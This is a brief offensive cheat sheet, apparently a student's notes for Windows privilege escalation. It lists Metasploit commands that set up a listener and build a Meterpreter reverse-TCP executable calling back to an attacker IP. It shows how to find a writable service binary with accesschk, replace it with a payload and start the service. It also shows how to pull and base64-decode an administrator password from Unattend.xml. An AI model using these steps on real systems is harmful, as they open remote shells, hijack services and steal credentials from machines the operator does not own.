Metasploit: 	
		msfconsole 
		use multi/handler
		set payload windows/meterpreter/reverse_tcp
		set lhost <IP>
		run
		msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> -f exe -o program.exe

Exe file service escalation:
		C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"

		copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"

		sc start filepermsvc
Configuration File:
		notepad C:\Windows\Panther\Unattend.xml
		Scroll down to the “<Password>” property and copy the base64 string that is confined between the “<Value>” tags underneath it. 
		echo [copied base64] | base64 -d
